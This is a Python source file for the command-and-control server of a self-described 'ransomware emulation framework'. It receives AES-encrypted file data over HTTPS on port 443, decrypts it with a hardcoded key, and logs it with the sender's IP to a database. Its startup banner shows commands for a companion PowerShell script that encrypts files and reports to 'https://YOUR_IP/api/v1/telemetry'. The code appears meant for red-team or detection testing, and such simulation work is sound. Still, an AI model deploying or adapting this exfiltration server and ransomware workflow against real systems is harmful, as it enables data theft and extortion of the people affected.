import asyncio, base64, aiosqlite, os
from quart import Quart, request, jsonify
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import logging

# Silence the specific hypercorn/asyncio transition errors
logging.getLogger('hypercorn.error').setLevel(logging.CRITICAL)
logging.getLogger('asyncio').setLevel(logging.CRITICAL)

app = Quart(__name__)
DB_FILE = "apex_vault.db"
SHARED_KEY = b"12345678901234567890123456789012"
CANARY_FILE = "_ADMIN_PASSWORDS.xlsx"

SPLASH = r"""
 █████╗ ██████╗ ███████╗██╗  ██╗    ██████╗ ██████╗  ██████╗ 
██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝    ██╔══██╗██╔══██╗██╔═══██╗
███████║██████╔╝█████╗   ╚███╔╝     ██████╔╝██████╔╝██║   ██║
██╔══██║██╔═══╝ ██╔══╝   ██╔██╗     ██╔═══╝ ██╔══██╗██║   ██║
██║  ██║██║     ███████╗██╔╝ ██╗    ██║     ██║  ██║╚██████╔╝
╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ 
            APEX PRO: RANSOMWARE EMULATION FRAMEWORK
                C2 Command & Control Server
"""

async def init_db():
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute('''CREATE TABLE IF NOT EXISTS telemetry 
             (id INTEGER PRIMARY KEY, ip TEXT, time DATETIME DEFAULT CURRENT_TIMESTAMP, payload TEXT, canary_tripped INTEGER)''')
        await db.commit()

@app.before_serving
async def startup():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(SPLASH)
    print(f"[*] C2 Listener: HTTPS/443 | Status: ACTIVE")
    print("-" * 65)
    print("USAGE EXAMPLES:")
    print("  Encrypt: .\\ApexSim.ps1 -Mode Encrypt -C2Url 'https://YOUR_IP/api/v1/telemetry'")
    print("  Decrypt: .\\ApexSim.ps1 -Mode Decrypt -TargetPath 'C:\\SimulationData'")
    print("-" * 65)
    await init_db()

def decrypt_payload(b64_data):
    raw = base64.b64decode(b64_data)
    iv, ciphertext = raw[:16], raw[16:]
    cipher = Cipher(algorithms.AES(SHARED_KEY), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded = decryptor.update(ciphertext) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(padded).decode('utf-8')

@app.route('/api/v1/telemetry', methods=['POST'])
async def telemetry():
    # ADD THIS LINE FOR DEBUGGING:
    print(f"[*] Connection received from: {request.remote_addr}")
    req_data = await request.get_json()
    b64_payload = req_data.get('payload')
    try:
        decrypted = await asyncio.to_thread(decrypt_payload, b64_payload)
        is_canary = 1 if CANARY_FILE in decrypted else 0
        if is_canary: print(f"\n[!!!] ALERT: {request.remote_addr} TRIPPED CANARY")
        async with aiosqlite.connect(DB_FILE) as db:
            await db.execute("INSERT INTO telemetry (ip, payload, canary_tripped) VALUES (?, ?, ?)", 
                           (request.remote_addr, decrypted, is_canary))
            await db.commit()
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 400

from hypercorn.config import Config
from hypercorn.asyncio import serve

if __name__ == '__main__':
    config = Config()
    config.bind = ["0.0.0.0:443"]
    config.certfile = 'apex_cert.pem'
    config.keyfile = 'apex_key.pem'
    
    # Add these lines to handle the timeout gracefully
    config.ssl_handshake_timeout = 10 
    config.keep_alive_timeout = 5
    config.graceful_timeout = 0 # Forces immediate closure without waiting

    asyncio.run(serve(app, config))